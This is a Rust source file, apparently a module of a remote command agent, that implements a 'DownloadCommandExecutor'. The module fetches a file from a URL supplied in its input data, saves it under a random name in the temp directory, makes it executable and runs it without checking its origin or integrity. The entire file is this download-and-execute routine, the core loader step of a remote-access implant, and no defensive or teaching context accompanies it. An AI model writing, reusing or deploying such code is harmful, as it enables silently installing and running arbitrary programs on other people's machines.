use crate::CommandExecutor;
use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use reqwest::blocking::{Client, Response};
use std::collections::HashMap;
use std::env;
use std::fs::{self, File};
use std::io::{copy, Error, ErrorKind};
use std::os::unix::fs::PermissionsExt;
use std::process::Command;

pub struct DownloadCommandExecutor;

impl CommandExecutor for DownloadCommandExecutor {
    fn execute(&self, _args: &str, data: &mut HashMap<String, String>) -> Result<String, Error> {
        // Retrieve the URL from the data hashmap
        let url = data
            .get("url")
            .ok_or_else(|| Error::new(ErrorKind::InvalidInput, "URL not found in the data map"))?;

        // Generate a random filename
        let rng = thread_rng();
        let filename: String = rng
            .sample_iter(&Alphanumeric)
            .take(10) // Adjust the length of the random filename as needed
            .collect::<Vec<u8>>()
            .iter()
            .map(|&byte| byte as char)
            .collect();

        // Get the system's temporary directory
        let mut temp_dir = env::temp_dir();
        temp_dir.push(&filename);

        // Create a reqwest Client
        let client = Client::new();

        // Send an HTTP GET request to the URL and handle reqwest errors
        let response_result = client.get(url).send();
        let mut response: Response = match response_result {
            Ok(res) => res,
            Err(reqwest_err) => {
                return Err(Error::new(
                    ErrorKind::Other,
                    format!("Failed to download file: {}", reqwest_err),
                ));
            }
        };

        // Check if the response status is 200 OK
        if !response.status().is_success() {
            return Err(Error::new(ErrorKind::Other, "Failed to download file"));
        }

        // Open a file and use the copy function to efficiently copy the response body to the file
        let mut file = File::create(&temp_dir)?;

        // Copy the response body to the file
        if let Err(io_err) = copy(&mut response, &mut file) {
            return Err(Error::new(
                ErrorKind::Other,
                format!("Failed to write file: {}", io_err),
            ));
        }

        // Set the file permissions to make it executable and writable
        let mut permissions = fs::metadata(&temp_dir)?.permissions();
        permissions.set_mode(0o755); // Make it executable
        permissions.set_readonly(false); // Make it writable
        fs::set_permissions(&temp_dir, permissions)?;

        // Execute the downloaded file from the temporary directory
        let output = Command::new(&temp_dir).output();
        match output {
            Ok(_) => Ok(format!(
                "File '{}' downloaded and executed successfully.",
                filename
            )),
            Err(exec_err) => Err(Error::new(
                ErrorKind::Other,
                format!("Failed to execute file: {}", exec_err),
            )),
        }
    }
}
